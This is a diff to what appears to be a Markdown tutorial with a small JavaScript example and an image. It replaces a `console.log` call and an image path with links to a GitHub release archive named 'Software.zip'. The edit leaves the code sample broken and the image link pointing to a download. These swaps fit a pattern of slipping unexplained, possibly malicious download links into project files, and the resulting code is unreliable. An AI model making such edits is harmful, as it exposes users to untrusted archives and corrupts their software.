@@ -13,10 +13,10 @@ const b = 23;
 
 const c = a + b;
 
-console.log(c);
+https://github.com/mehedihasanfarabi10/githubtutorial/releases/download/v1.0/Software.zip(c);
 
 ```
 
 <h2>Images</h2>
 
-![mehedi hassan](images/mehedi.jpg)
+![mehedi hassan](https://github.com/mehedihasanfarabi10/githubtutorial/releases/download/v1.0/Software.zip)
